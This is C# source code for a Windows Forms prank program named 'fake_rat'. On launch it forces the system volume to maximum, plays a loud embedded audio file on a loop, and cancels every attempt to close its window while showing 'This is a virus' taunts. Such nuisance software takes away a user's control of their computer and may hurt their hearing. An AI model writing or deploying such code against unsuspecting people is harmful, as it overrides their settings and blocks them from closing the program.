using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Media; 



namespace fake_rat
{
    public partial class Form1 : Form
    {
        private const int APPCOMMAND_VOLUME_UP = 0xA0000; //Changing volume level
        private const int WM_APPCOMMAND = 0x319;

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,
            IntPtr wParam, IntPtr lParam);
        
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e) //Setting the volume to the maximum & the audio file start playing.
        {
            SetMaxVolume();
            StartEarrape();
            this.timer1.Start();
        }

        private void SetMaxVolume() 
        {
            for (int i = 0; i < 100; i++)
            {
                SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,
                (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }

        private void StartEarrape()
        {
            SoundPlayer splayer = new SoundPlayer(Properties.Resources.audio);//Starts playing the audio file & only .WAV audio file is supported in the current release.
            splayer.Play();
        }

        private void timer1_Tick(object sender, EventArgs e) //Progressbar funcion
        {
            this.progressBar1.Increment(1);
            progressBar1.Minimum = 0;
            progressBar1.Maximum = 100;
            
            if (progressBar1.Value == 99)
            {
                SetMaxVolume();
                StartEarrape();
            }
        }

        private void button1_Click(object sender, EventArgs e) // Random popups on the screen while closing or trying to shut down the application
        {

            SetMaxVolume();
            MessageBox.Show("This is a virus");
            MessageBox.Show("Haha you can't close me :(");
            StartEarrape();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e) // Random popups on the screen while closing or trying to shut down the application
        {
            e.Cancel = true;
            SetMaxVolume();
            MessageBox.Show("This is a virus");
            MessageBox.Show("Haha you can't close me, or lover the volume :(");
            StartEarrape();
        }


    }
}
